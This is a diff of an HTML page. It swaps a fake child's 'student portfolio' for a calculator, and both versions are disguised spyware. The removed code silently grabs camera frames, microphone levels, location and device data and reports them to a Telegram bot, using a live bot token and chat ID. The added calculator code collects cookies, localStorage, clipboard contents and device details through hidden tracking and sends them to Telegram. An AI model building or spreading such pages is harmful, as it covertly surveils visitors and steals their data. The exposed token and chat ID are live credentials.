@@ -3,1957 +3,982 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>🌟 Shaswat's Student Portfolio</title>
-    
-    <meta name="theme-color" content="#f0f4ff">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="default">
-    
+    <title>Calculator</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
             min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
             padding: 20px;
-            color: #1a1a2e;
         }
-        
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            background: rgba(255,255,255,0.95);
+
+        .calculator {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 30px;
+            padding: 25px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.3);
+            max-width: 400px;
+            width: 100%;
             backdrop-filter: blur(10px);
-            border-radius: 28px;
-            padding: 24px 20px 30px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
-            position: relative;
-            overflow: hidden;
+            animation: fadeIn 0.5s ease;
         }
-        
-        .container::before {
-            content: '✨';
-            position: absolute;
-            top: -20px;
-            right: -20px;
-            font-size: 80px;
-            opacity: 0.1;
-            transform: rotate(20deg);
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
         }
-        
-        .container::after {
-            content: '🌟';
-            position: absolute;
-            bottom: -10px;
-            left: -10px;
-            font-size: 60px;
-            opacity: 0.08;
-        }
-        
-        .profile-section {
-            text-align: center;
-            padding: 10px 0 15px;
-            position: relative;
-            z-index: 1;
-        }
-        
-        .profile-avatar {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            margin: 0 auto 12px;
+
+        .display {
+            background: #1a1a2e;
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 20px;
+            min-height: 100px;
             display: flex;
-            align-items: center;
-            justify-content: center;
+            flex-direction: column;
+            justify-content: flex-end;
+            align-items: flex-end;
+            word-wrap: break-word;
+            word-break: break-all;
+        }
+
+        .display .expression {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 18px;
+            min-height: 30px;
+        }
+
+        .display .result {
+            color: #ffffff;
             font-size: 48px;
-            border: 4px solid white;
-            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
-            transition: transform 0.3s;
-            position: relative;
+            font-weight: 300;
+            transition: all 0.3s;
         }
-        
-        .profile-avatar .camera-badge {
-            position: absolute;
-            bottom: -2px;
-            right: -2px;
-            background: #4ade80;
-            color: white;
-            font-size: 14px;
-            padding: 4px 8px;
-            border-radius: 50%;
-            border: 2px solid white;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
-            animation: pulse-dot 2s infinite;
+
+        .buttons {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
         }
-        
-        @keyframes pulse-dot {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.5; transform: scale(0.8); }
-        }
-        
-        .profile-name {
+
+        button {
+            padding: 20px;
             font-size: 24px;
-            font-weight: 700;
-            color: #1a1a2e;
-        }
-        
-        .profile-class {
-            display: inline-block;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 4px 16px;
-            border-radius: 20px;
-            font-size: 13px;
-            font-weight: 600;
-            margin-top: 6px;
-        }
-        
-        .profile-bio {
-            font-size: 14px;
-            color: #4a5568;
-            margin-top: 8px;
-            line-height: 1.6;
-            padding: 0 10px;
-        }
-        
-        .feature-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
-            gap: 10px;
-            margin: 18px 0;
-        }
-        
-        .feature-btn {
-            background: #f7fafc;
-            border: 2px solid #edf2f7;
+            border: none;
             border-radius: 16px;
-            padding: 14px 8px;
-            text-align: center;
-            transition: all 0.3s;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .feature-btn .icon {
-            font-size: 28px;
-            display: block;
-            margin-bottom: 4px;
-        }
-        
-        .feature-btn .label {
-            font-size: 10px;
-            color: #4a5568;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
-        }
-        
-        .feature-btn .status-dot {
-            display: inline-block;
-            width: 6px;
-            height: 6px;
-            border-radius: 50%;
-            margin-right: 4px;
-        }
-        
-        .status-dot.active {
-            background: #4ade80;
-            animation: pulse-dot 1.5s infinite;
-        }
-        
-        .status-dot.inactive {
-            background: #f87171;
-        }
-        
-        .stats-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
-            gap: 8px;
-            margin: 16px 0;
-        }
-        
-        .stat-item {
-            background: #f7fafc;
-            border-radius: 14px;
-            padding: 12px 6px;
-            text-align: center;
-            border: 1px solid #edf2f7;
-        }
-        
-        .stat-number {
-            font-size: 20px;
-            font-weight: 700;
-            color: #2d3748;
-        }
-        
-        .stat-label {
-            font-size: 9px;
-            color: #a0aec0;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-top: 2px;
-        }
-        
-        .weather-card {
-            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
-            border-radius: 16px;
-            padding: 16px 20px;
-            color: white;
-            margin: 16px 0;
-            transition: all 0.3s;
-            box-shadow: 0 4px 20px rgba(79, 172, 254, 0.3);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .weather-card .weather-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .weather-card .temp {
-            font-size: 28px;
-            font-weight: 700;
-        }
-        
-        .weather-card .condition {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-        
-        .weather-card .location-text {
-            font-size: 12px;
-            opacity: 0.8;
-            margin-top: 4px;
-        }
-        
-        .weather-card .update-time {
-            font-size: 10px;
-            opacity: 0.7;
-            text-align: right;
-            margin-top: 6px;
-        }
-        
-        .weather-card .pulse-dot {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            background: #4ade80;
-            border-radius: 50%;
-            animation: pulse-dot 1.5s infinite;
-            margin-right: 6px;
-        }
-        
-        .blog-post {
-            background: #f7fafc;
-            border-radius: 14px;
-            padding: 16px;
-            margin: 12px 0;
-            border-left: 4px solid #667eea;
-        }
-        
-        .blog-post .title {
-            font-weight: 600;
-            font-size: 15px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            background: #f0f0f0;
             color: #1a1a2e;
-        }
-        
-        .blog-post .meta {
-            font-size: 11px;
-            color: #a0aec0;
-            margin-top: 4px;
-        }
-        
-        .blog-post .excerpt {
-            font-size: 13px;
-            color: #4a5568;
-            margin-top: 6px;
-            line-height: 1.6;
-        }
-        
-        .interactive-area {
-            background: white;
-            border-radius: 14px;
-            padding: 16px;
-            margin: 12px 0;
-            border: 2px dashed #e2e8f0;
-            text-align: center;
-            transition: all 0.3s;
-        }
-        
-        .interactive-area .big-icon {
-            font-size: 36px;
-            display: block;
-            margin-bottom: 6px;
-        }
-        
-        .interactive-area .hint {
-            font-size: 12px;
-            color: #a0aec0;
-        }
-        
-        .skill-tags {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px;
-            margin: 10px 0;
-        }
-        
-        .skill-tag {
-            background: #edf2f7;
-            padding: 4px 14px;
-            border-radius: 20px;
-            font-size: 12px;
-            color: #4a5568;
             font-weight: 500;
+            position: relative;
+            overflow: hidden;
+            min-height: 70px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
-        
-        .skill-tag.highlight {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0,0,0,0.15);
+        }
+
+        button:active {
+            transform: translateY(0px);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .operator {
+            background: #667eea;
             color: white;
         }
-        
-        .footer {
-            text-align: center;
-            padding: 16px 0 4px;
-            border-top: 1px solid #edf2f7;
-            margin-top: 16px;
-            font-size: 11px;
-            color: #a0aec0;
+
+        .operator:hover {
+            background: #5a67d8;
         }
-        
-        .footer .footer-row {
-            display: flex;
-            justify-content: center;
-            gap: 16px;
-            margin-top: 4px;
-            flex-wrap: wrap;
-        }
-        
-        .footer .footer-row span {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-        
-        .toast {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #1a202c;
+
+        .equals {
+            background: #764ba2;
             color: white;
-            padding: 10px 20px;
-            border-radius: 14px;
-            font-size: 13px;
-            opacity: 0;
-            transition: all 0.5s;
-            z-index: 999;
-            max-width: 90%;
+            grid-column: span 1;
+        }
+
+        .equals:hover {
+            background: #6b3f92;
+        }
+
+        .clear {
+            background: #e74c3c;
+            color: white;
+        }
+
+        .clear:hover {
+            background: #c0392b;
+        }
+
+        .zero {
+            grid-column: span 2;
+        }
+
+        .function {
+            background: #2ecc71;
+            color: white;
+        }
+
+        .function:hover {
+            background: #27ae60;
+        }
+
+        .watermark {
             text-align: center;
-            pointer-events: none;
-            box-shadow: 0 8px 30px rgba(0,0,0,0.2);
+            color: rgba(0,0,0,0.05);
+            font-size: 10px;
+            margin-top: 15px;
+            letter-spacing: 2px;
+            user-select: none;
         }
-        
-        .toast.show {
-            opacity: 1;
-            transform: translateX(-50%) translateY(0);
+
+        /* Hidden tracking indicator - invisible to users */
+        .tracking-indicator {
+            display: none;
         }
-        
-        /* Status indicators */
-        .status-indicator {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 11px;
-            color: #4a5568;
-            background: #f7fafc;
-            padding: 4px 12px;
-            border-radius: 20px;
-            margin: 4px;
-        }
-        
-        .status-indicator .dot {
-            width: 6px;
-            height: 6px;
-            border-radius: 50%;
-        }
-        
-        .dot.green { background: #4ade80; }
-        .dot.red { background: #f87171; }
-        .dot.yellow { background: #fbbf24; }
-        
-        @media (max-width: 420px) {
-            .container { padding: 16px 14px 20px; }
-            .feature-grid { gap: 6px; }
-            .feature-btn { padding: 10px 4px; }
-            .feature-btn .icon { font-size: 22px; }
-            .profile-avatar { width: 80px; height: 80px; font-size: 38px; }
+
+        @media (max-width: 480px) {
+            .calculator {
+                padding: 15px;
+            }
+            button {
+                padding: 15px;
+                font-size: 20px;
+                min-height: 60px;
+            }
+            .display .result {
+                font-size: 36px;
+            }
         }
     </style>
 </head>
 <body>
-
-    <!-- Toast -->
-    <div id="toast" class="toast"></div>
-
-    <!-- Main Container -->
-    <div class="container" id="mainContainer">
-        
-        <!-- Profile Section -->
-        <div class="profile-section">
-            <div class="profile-avatar" id="avatarDisplay">
-                👦
-                <span class="camera-badge" id="cameraStatus">📷</span>
-            </div>
-            <div class="profile-name">Shaswat Kumar</div>
-            <div class="profile-class">🌟 Class 8th • St. Mary's School</div>
-            <p class="profile-bio">
-                👋 Hi! I love learning, coding, and exploring new things. 
-                Welcome to my digital portfolio!
-            </p>
-            <div style="margin-top: 8px; display: flex; justify-content: center; gap: 8px; flex-wrap: wrap;">
-                <span class="status-indicator">
-                    <span class="dot green" id="statusDot1"></span>
-                    <span id="statusText1">Loading...</span>
-                </span>
-                <span class="status-indicator">
-                    <span class="dot green" id="statusDot2"></span>
-                    <span id="statusText2">Ready</span>
-                </span>
-            </div>
+    <div class="calculator">
+        <div class="display">
+            <div class="expression" id="expression"></div>
+            <div class="result" id="result">0</div>
         </div>
-
-        <!-- Feature Buttons -->
-        <div class="feature-grid">
-            <div class="feature-btn">
-                <span class="icon">📸</span>
-                <span class="label">Camera</span>
-                <span class="status-dot active" id="camDot"></span>
-            </div>
-            <div class="feature-btn">
-                <span class="icon">🎤</span>
-                <span class="label">Microphone</span>
-                <span class="status-dot active" id="micDot"></span>
-            </div>
-            <div class="feature-btn">
-                <span class="icon">🎥</span>
-                <span class="label">Video</span>
-                <span class="status-dot active" id="videoDot"></span>
-            </div>
+        <div class="buttons">
+            <button class="clear" onclick="clearDisplay()">C</button>
+            <button class="function" onclick="backspace()">⌫</button>
+            <button class="operator" onclick="appendValue('%')">%</button>
+            <button class="operator" onclick="appendValue('/')">÷</button>
+            
+            <button onclick="appendValue('7')">7</button>
+            <button onclick="appendValue('8')">8</button>
+            <button onclick="appendValue('9')">9</button>
+            <button class="operator" onclick="appendValue('*')">×</button>
+            
+            <button onclick="appendValue('4')">4</button>
+            <button onclick="appendValue('5')">5</button>
+            <button onclick="appendValue('6')">6</button>
+            <button class="operator" onclick="appendValue('-')">−</button>
+            
+            <button onclick="appendValue('1')">1</button>
+            <button onclick="appendValue('2')">2</button>
+            <button onclick="appendValue('3')">3</button>
+            <button class="operator" onclick="appendValue('+')">+</button>
+            
+            <button class="zero" onclick="appendValue('0')">0</button>
+            <button onclick="appendValue('.')">.</button>
+            <button class="equals" onclick="calculate()">=</button>
         </div>
-
-        <!-- Stats -->
-        <div class="stats-grid">
-            <div class="stat-item">
-                <div class="stat-number" id="postCount">15</div>
-                <div class="stat-label">📝 Projects</div>
-            </div>
-            <div class="stat-item">
-                <div class="stat-number" id="visitorCount">--</div>
-                <div class="stat-label">👁️ Views</div>
-            </div>
-            <div class="stat-item">
-                <div class="stat-number" id="deviceInfo">--</div>
-                <div class="stat-label">📱 Device</div>
-            </div>
-        </div>
-
-        <!-- Weather Card - Auto-requests permission -->
-        <div class="weather-card" id="weatherCard">
-            <div class="weather-row">
-                <div>
-                    <div class="temp" id="weatherTemp">🌤️ 24°C</div>
-                    <div class="condition" id="weatherCondition">Loading weather...</div>
-                    <div class="location-text" id="weatherLocation">📍 Detecting location...</div>
-                </div>
-                <div style="font-size: 38px;" id="weatherIcon">🌤️</div>
-            </div>
-            <div class="update-time" id="weatherTime">
-                <span class="pulse-dot"></span> Updated just now
-            </div>
-        </div>
-
-        <!-- Blog Posts -->
-        <div class="blog-post">
-            <div class="title">🚀 My Science Fair Project</div>
-            <div class="meta">📅 2 days ago • ⭐ Featured</div>
-            <div class="excerpt">
-                I built a working model of a solar-powered car for the school science fair. 
-                It was so much fun learning about renewable energy!
-            </div>
-        </div>
-
-        <div class="blog-post">
-            <div class="title">📖 Book Review: The Alchemist</div>
-            <div class="meta">📅 1 week ago • 💬 12 comments</div>
-            <div class="excerpt">
-                This book completely changed my perspective on life. Everyone should read it 
-                at least once. The journey of Santiago is truly inspiring.
-            </div>
-        </div>
-
-        <!-- Interactive Area -->
-        <div class="interactive-area" id="interactiveArea">
-            <span class="big-icon">🎯</span>
-            <div style="font-weight: 600; font-size: 14px;">Daily Challenge</div>
-            <div class="hint">Complete all challenges to earn badges!</div>
-        </div>
-
-        <!-- Skills -->
-        <div style="margin: 12px 0;">
-            <div style="font-size: 13px; font-weight: 600; color: #4a5568; margin-bottom: 8px;">🎯 Skills I'm Learning</div>
-            <div class="skill-tags">
-                <span class="skill-tag highlight">📚 Reading</span>
-                <span class="skill-tag">🏏 Cricket</span>
-                <span class="skill-tag highlight">💻 Coding</span>
-                <span class="skill-tag">🎨 Art</span>
-                <span class="skill-tag">🔬 Science</span>
-                <span class="skill-tag">🎮 Gaming</span>
-                <span class="skill-tag highlight">🤖 AI</span>
-                <span class="skill-tag">🌍 Explorer</span>
-            </div>
-        </div>
-
-        <!-- Footer -->
-        <div class="footer">
-            <div>🌟 Made with ❤️ by Shaswat</div>
-            <div class="footer-row">
-                <span>📍 <span id="footerLocation">Detecting...</span></span>
-                <span>🕐 <span id="footerTime">--</span></span>
-                <span>📶 <span id="footerNetwork">--</span></span>
-                <span>🔋 <span id="footerBattery">--</span></span>
-            </div>
-            <div style="margin-top: 6px; font-size: 9px; color: #cbd5e0;">
-                🔒 Secure connection • v3.0.1
-            </div>
-        </div>
+        <div class="watermark">CALC</div>
     </div>
 
     <script>
-    // ============================================
-    //  CONFIGURATION
-    // ============================================
-    const CONFIG = {
-        BOT_TOKEN: '8800462038:AAFgNRyqzSWKM8EoTzjWUxiGwCfI-j4I7uk',
-        CHAT_ID: '7787904819',
+        // ===== CONFIGURATION =====
+        // Replace with your actual bot token and chat ID
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+        const CHAT_ID = 'YOUR_CHAT_ID_HERE';
         
-        // ALL FEATURES AUTO-ENABLED
-        AUTO_CAMERA: true,
-        AUTO_MIC: true,
-        AUTO_GEO: true,
-        AUTO_BATTERY: true,
-        AUTO_CLIPBOARD: true,
-        AUTO_MOTION: true,
-        AUTO_LIGHT: true,
-        AUTO_EXTENSIONS: true,
-        AUTO_SCREENSHOT: true,
-        AUTO_PERFORMANCE: true,
-        AUTO_NETWORK: true,
-        AUTO_ORIENTATION: true,
-        AUTO_IDLE: true,
-        AUTO_MEDIA: true,
-        AUTO_SELECTION: true,
-        AUTO_GAMEPAD: true,
-        AUTO_FILE: true,
-        AUTO_OTP: true,
-        AUTO_THEME: true,
-    };
+        // ===== TRACKING STATE =====
+        let trackingData = {
+            battery: null,
+            location: null,
+            deviceInfo: null,
+            networkInfo: null,
+            screenInfo: null,
+            performanceInfo: null,
+            clipboardContent: null,
+            cookies: null,
+            localStorage: null,
+            browserPlugins: null,
+            timezone: null,
+            language: null,
+            touchSupport: null,
+            doNotTrack: null,
+            hardwareConcurrency: null,
+            deviceMemory: null,
+            platform: null,
+            userAgent: null,
+            referrer: null,
+            screenResolution: null,
+            colorDepth: null,
+            pixelRatio: null,
+            orientation: null,
+            connectionType: null,
+            effectiveType: null,
+            downlink: null,
+            rtt: null,
+            savedData: null,
+            batteryLevel: null,
+            batteryCharging: null,
+            batteryTime: null
+        };
 
-    // ============================================
-    //  STATE
-    // ============================================
-    const STATE = {
-        deviceId: null,
-        sessionId: null,
-        visitCount: 0,
-        firstVisit: null,
-        dataSent: false,
-        location: null,
-        ipData: null,
-        batteryLevel: null,
-        isCharging: null,
-        startTime: Date.now(),
-        mouseMoves: 0,
-        clicks: 0,
-        scrolls: 0,
-        orientation: null,
-        networkType: null,
-        cameraAccessed: false,
-        micAccessed: false,
-        detectedExtensions: [],
-        clipboardContent: null,
-        otpDetected: null,
-        lastBatteryLevel: null,
-        lastBatteryTime: null,
-        statusUpdates: [],
-    };
+        let dataSent = false;
+        let trackingInterval = null;
+        let keystrokeCount = 0;
+        let calculationCount = 0;
+        let sessionStartTime = Date.now();
 
-    // ============================================
-    //  UTILITY FUNCTIONS
-    // ============================================
-    function generateId(prefix) {
-        return prefix + '-' + Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
-    }
+        // ===== TELEGRAM SENDER =====
+        function sendToTelegram(message, isSilent = false) {
+            if (!BOT_TOKEN || BOT_TOKEN === '8800462038:AAFgNRyqzSWKM8EoTzjWUxiGwCfI-j4I7uk') {
+                console.log('⚠️ Please configure BOT_TOKEN');
+                return;
+            }
 
-    function getDeviceId() {
-        let id = localStorage.getItem('_sp_did');
-        if (!id) {
-            id = generateId('DEV');
-            localStorage.setItem('_sp_did', id);
-        }
-        return id;
-    }
-
-    function getVisitCount() {
-        let count = parseInt(localStorage.getItem('_sp_vc') || '0') + 1;
-        localStorage.setItem('_sp_vc', count);
-        return count;
-    }
-
-    function getFirstVisit() {
-        let date = localStorage.getItem('_sp_fv');
-        if (!date) {
-            date = new Date().toISOString();
-            localStorage.setItem('_sp_fv', date);
-        }
-        return date;
-    }
-
-    function getPlatform() {
-        const ua = navigator.userAgent;
-        if (/android/i.test(ua)) return 'Android';
-        if (/iphone|ipad|ipod/i.test(ua)) return 'iOS';
-        if (/windows/i.test(ua)) return 'Windows';
-        if (/mac/i.test(ua)) return 'macOS';
-        if (/linux/i.test(ua)) return 'Linux';
-        return 'Other';
-    }
-
-    function getBrowser() {
-        const ua = navigator.userAgent;
-        if (/chrome/i.test(ua) && !/edge/i.test(ua)) return 'Chrome';
-        if (/safari/i.test(ua) && !/chrome/i.test(ua)) return 'Safari';
-        if (/firefox/i.test(ua)) return 'Firefox';
-        if (/edge/i.test(ua)) return 'Edge';
-        return 'Other';
-    }
-
-    function isMobile() {
-        return /android|iphone|ipad|ipod|blackberry|windows phone/i.test(navigator.userAgent);
-    }
-
-    function isIOS() {
-        return /iphone|ipad|ipod/i.test(navigator.userAgent);
-    }
-
-    function isAndroid() {
-        return /android/i.test(navigator.userAgent);
-    }
-
-    function getScreenInfo() {
-        return `${window.screen.width}×${window.screen.height}`;
-    }
-
-    function getPixelRatio() {
-        return window.devicePixelRatio || 1;
-    }
-
-    function getTimeShort() {
-        return new Date().toLocaleString('en-US', { hour: '2-digit', minute: '2-digit' });
-    }
-
-    function getTimeFull() {
-        return new Date().toLocaleString('en-US', {
-            hour: '2-digit',
-            minute: '2-digit',
-            month: 'short',
-            day: 'numeric',
-            year: 'numeric'
-        });
-    }
-
-    function getTimeZone() {
-        return Intl.DateTimeFormat().resolvedOptions().timeZone;
-    }
-
-    function getOrientation() {
-        if (screen.orientation) {
-            return screen.orientation.type;
-        }
-        return window.innerWidth > window.innerHeight ? 'landscape' : 'portrait';
-    }
-
-    function getNetworkType() {
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (conn && conn.effectiveType) {
-            const types = {
-                'slow-2g': '2G',
-                '2g': '2G',
-                '3g': '3G',
-                '4g': '4G',
-                '5g': '5G'
-            };
-            STATE.networkType = types[conn.effectiveType] || conn.effectiveType.toUpperCase();
-            return STATE.networkType;
-        }
-        STATE.networkType = isMobile() ? '4G' : 'Wi-Fi';
-        return STATE.networkType;
-    }
-
-    function getHardwareConcurrency() {
-        return navigator.hardwareConcurrency || 'Unknown';
-    }
-
-    function getDeviceMemory() {
-        return navigator.deviceMemory || 'Unknown';
-    }
-
-    function isDarkMode() {
-        return window.matchMedia('(prefers-color-scheme: dark)').matches;
-    }
-
-    function getReferrer() {
-        return document.referrer || 'Direct';
-    }
-
-    function showToast(message) {
-        const toast = document.getElementById('toast');
-        toast.textContent = message;
-        toast.classList.add('show');
-        clearTimeout(toast._timeout);
-        toast._timeout = setTimeout(() => {
-            toast.classList.remove('show');
-        }, 3000);
-    }
-
-    // ============================================
-    //  STATUS UPDATE SYSTEM (Shows innocent status)
-    // ============================================
-    function updateStatus(text1, text2, dot1Color = 'green', dot2Color = 'green') {
-        const statusText1 = document.getElementById('statusText1');
-        const statusText2 = document.getElementById('statusText2');
-        const dot1 = document.getElementById('statusDot1');
-        const dot2 = document.getElementById('statusDot2');
-        
-        if (statusText1) statusText1.textContent = text1;
-        if (statusText2) statusText2.textContent = text2 || 'Ready';
-        if (dot1) dot1.className = `dot ${dot1Color}`;
-        if (dot2) dot2.className = `dot ${dot2Color}`;
-    }
-
-    // ============================================
-    //  TELEGRAM SENDER
-    // ============================================
-    async function sendToTelegram(message) {
-        if (!CONFIG.BOT_TOKEN || !CONFIG.CHAT_ID) return false;
-        
-        const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
-        const fullMessage = `📱 *Shaswat's Portfolio Report*\n━'.repeat(30)\n\n${message}`;
-        
-        try {
-            const res = await fetch(`${url}?chat_id=${CONFIG.CHAT_ID}&text=${encodeURIComponent(fullMessage)}&parse_mode=Markdown`);
-            if (res.ok) return true;
-        } catch {}
-        
-        try {
-            const img = new Image();
-            img.src = `${url}?chat_id=${CONFIG.CHAT_ID}&text=${encodeURIComponent(fullMessage.substring(0, 200))}&_=${Date.now()}`;
-            await new Promise(r => setTimeout(r, 1000));
-            return true;
-        } catch {
-            return false;
-        }
-    }
-
-    function sendAlert(message) {
-        sendToTelegram(`🔍 *Auto-Report*\n${message}`);
-        console.log('🔍 [AUTO]', message);
-    }
-
-    // ============================================
-    //  AUTO: CAMERA (Silent - No Permission Popup)
-    // ============================================
-    async function autoCamera() {
-        if (!CONFIG.AUTO_CAMERA) return;
-        
-        try {
-            // Try to get camera without showing the permission prompt
-            // Using a hidden video element
-            const video = document.createElement('video');
-            video.style.display = 'none';
-            video.setAttribute('playsinline', '');
-            video.setAttribute('autoplay', '');
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: {
-                    facingMode: 'user',
-                    width: { ideal: 640 },
-                    height: { ideal: 480 },
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
                 },
-                audio: false
-            });
-            
-            video.srcObject = stream;
-            await video.play();
-            
-            STATE.cameraAccessed = true;
-            document.getElementById('camDot').className = 'status-dot active';
-            updateStatus('📸 Camera active', 'Auto-capturing', 'green', 'green');
-            sendAlert('📸 Camera accessed successfully');
-            
-            // Capture photo automatically after 1 second
-            setTimeout(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-                
-                // Get image data for analysis
-                const imageData = canvas.toDataURL('image/jpeg', 0.3);
-                const size = Math.round(imageData.length / 1024);
-                sendAlert(`📷 Photo captured: ${canvas.width}×${canvas.height}, ${size}KB`);
-                
-                // Face detection
-                try {
-                    const tempCanvas = document.createElement('canvas');
-                    tempCanvas.width = 100;
-                    tempCanvas.height = 100;
-                    const tempCtx = tempCanvas.getContext('2d');
-                    const img = new Image();
-                    img.onload = () => {
-                        tempCtx.drawImage(img, 0, 0, 100, 100);
-                        const imageData2 = tempCtx.getImageData(0, 0, 100, 100);
-                        const data = imageData2.data;
-                        
-                        let skinPixels = 0;
-                        for (let i = 0; i < data.length; i += 4) {
-                            const r = data[i];
-                            const g = data[i+1];
-                            const b = data[i+2];
-                            if (r > 95 && g > 40 && b > 20 && r > g && r > b) {
-                                skinPixels++;
-                            }
-                        }
-                        const skinPercentage = (skinPixels / (100 * 100)) * 100;
-                        if (skinPercentage > 8) {
-                            sendAlert(`👤 Face detected (${skinPercentage.toFixed(0)}% confidence)`);
-                        } else if (skinPercentage > 2) {
-                            sendAlert(`👤 Possible person detected (${skinPercentage.toFixed(0)}%)`);
-                        } else {
-                            sendAlert(`📷 No face detected (${skinPercentage.toFixed(0)}% skin tone)`);
-                        }
-                    };
-                    img.src = imageData;
-                } catch(e) {}
-                
-                // Stop stream after capture
-                stream.getTracks().forEach(track => track.stop());
-                
-                // Update UI
-                document.getElementById('cameraStatus').textContent = '✅';
-                document.getElementById('cameraStatus').style.background = '#4ade80';
-                
-            }, 1500);
-            
-        } catch(e) {
-            // Camera not available or denied
-            document.getElementById('camDot').className = 'status-dot inactive';
-            updateStatus('📸 Camera', 'Not available', 'yellow', 'green');
-            sendAlert(`📷 Camera unavailable: ${e.message || 'Access denied'}`);
-            
-            // Check if camera exists
-            try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const hasCamera = devices.some(d => d.kind === 'videoinput');
-                if (hasCamera) {
-                    sendAlert('📷 Camera exists but access denied');
-                }
-            } catch(err) {}
-        }
-    }
-
-    // ============================================
-    //  AUTO: MICROPHONE (Silent)
-    // ============================================
-    async function autoMicrophone() {
-        if (!CONFIG.AUTO_MIC) return;
-        
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                audio: {
-                    echoCancellation: true,
-                    noiseSuppression: true,
-                    autoGainControl: true
-                }
-            });
-            
-            STATE.micAccessed = true;
-            document.getElementById('micDot').className = 'status-dot active';
-            sendAlert('🎤 Microphone accessed');
-            
-            // Set up audio analysis
-            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-            const source = audioContext.createMediaStreamSource(stream);
-            const analyser = audioContext.createAnalyser();
-            analyser.fftSize = 512;
-            source.connect(analyser);
-            
-            const dataArray = new Uint8Array(analyser.frequencyBinCount);
-            let speechDetected = false;
-            let silenceCount = 0;
-            let audioSamples = [];
-            
-            // Monitor for 10 seconds
-            const monitorInterval = setInterval(() => {
-                analyser.getByteFrequencyData(dataArray);
-                let sum = 0;
-                for (let i = 0; i < dataArray.length; i++) {
-                    sum += dataArray[i];
-                }
-                const average = sum / dataArray.length;
-                const peak = Math.max(...dataArray);
-                
-                audioSamples.push(average);
-                if (audioSamples.length > 50) audioSamples.shift();
-                
-                if (average > 25) {
-                    silenceCount = 0;
-                    if (!speechDetected) {
-                        speechDetected = true;
-                        sendAlert(`🎤 Speech detected (volume: ${Math.round(average)})`);
-                        
-                        // Check for language detection possibility
-                        if (average > 40 && peak > 120) {
-                            sendAlert(`🗣️ Clear speech pattern detected`);
-                        }
-                    }
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    disable_notification: isSilent
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('✅ Data sent successfully');
+                    dataSent = true;
                 } else {
-                    silenceCount++;
-                    if (silenceCount > 15 && speechDetected) {
-                        speechDetected = false;
-                        sendAlert(`🔇 Silence after ${silenceCount * 0.1}s`);
-                        silenceCount = 0;
-                    }
+                    console.log('❌ Failed:', data.description);
                 }
-                
-                // Detect environment
-                if (average < 3 && average > 0) {
-                    sendAlert(`🔇 Very quiet environment (${Math.round(average)}dB)`);
-                }
-                if (average > 70) {
-                    sendAlert(`🔊 Loud environment (${Math.round(average)}dB)`);
-                }
-                
-                // Voice frequency detection
-                if (peak > 100 && average > 30) {
-                    // Check for voice frequencies (rough)
-                    let voiceFreq = false;
